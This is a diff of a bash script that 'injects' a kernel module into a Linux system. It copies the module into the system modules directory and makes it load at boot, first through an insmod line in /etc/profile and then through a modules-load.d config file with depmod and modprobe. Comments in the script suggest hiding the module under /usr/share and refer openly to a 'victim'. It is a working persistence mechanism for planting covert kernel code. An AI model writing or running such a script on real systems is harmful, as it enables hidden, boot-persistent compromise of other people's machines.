@@ -1,7 +1,14 @@
 #!/usr/bin/bash
 #
-#  Shell script that will inject module into profile script
-# 
+#  Shell script that will inject module into the system (or at least die trying to)
+#		location of the module will be in expected places, how this module was 
+#       primary mend to test log reading capacities. Module can be loaded in and hidden in 
+#       different ways, a good usage case would be to hide module into /usr/share path and 
+#       insert the same using for eg. profile script. Be creative and don't forget usage of this
+#       module can be pain in the neck for the victim, so don't be to harsh on them.
+#
+#
+#
 #  Usage:
 #      bash inject_ksm.sh module.ko.path 
 #
@@ -22,7 +29,7 @@ if [ "$EUID" -ne 0 ]; then
 	exit 1
 fi
 
-MODULE_NAME=$(basename $1)
+MODULE_NAME=$(basename -s .ko  $1)
 MODULES_PATH=/usr/lib/modules/$(uname -r)/
 
 # copy module to safe location?
@@ -38,17 +45,16 @@ else
 	exit 1
 fi
 
+echo "Installing module"
 cp $1 $MODULES_PATH"/"
 
-# inject module insert command into profile script
-if [ -f /etc/profile ]; then
-
-	if [[ $(cat /etc/profile | grep "insmod" | wc -l) = *0* ]]; then
-		echo "insmod "$MODULES_PATH"/"$MODULE_NAME" " >> /etc/profile
-	fi
-
-else
-	echo "Cannot find sutible injection script, giving up ..."
-	exit 1
+echo "Inserting module on boot time"
+if  [[ -d "/usr/lib/modules-load.d" ]]; then
+	echo $MODULE_NAME > "/usr/lib/modules-load.d/"$MODULE_NAME".conf"
+	sleep 1
+	depmod -a
+	modinfo $MODULE_NAME
+	modprobe $MODULE_NAME
+	# TODO: add options for the module
 fi
 
